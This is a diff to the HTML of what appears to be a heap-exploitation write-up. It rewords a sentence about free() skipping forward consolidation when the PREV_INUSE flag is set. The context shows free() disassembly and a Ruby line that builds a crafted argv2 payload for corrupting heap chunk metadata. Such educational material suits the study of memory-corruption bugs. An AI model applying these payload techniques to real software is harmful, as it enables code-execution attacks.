@@ -1498,8 +1498,8 @@ triggered the following part of pseudocode with the first <code>free()</code>:</
 </span><span class='line'>0x08049933 &lt;free+271>: cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?</span></code></pre></td></tr></table></div></figure>
 
 
-<p>Here at the position <code>-0x4</code> is <code>DEFG</code> chunk (prev_size), with the size <code>-0x8</code>, where the <code>PREV_INUSE</code> flag is set <code>(43424101)</code>, so we skipped
-the forward consolidation:</p>
+<p>Here we are verifying, if the <code>PREV_INUSE</code> flag is set <code>(0x43424101)</code>, so we
+skipped the forward consolidation:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">argv2</span>  <span class="o">=</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;ABCDEFG&quot;</span> <span class="c1"># user data</span>
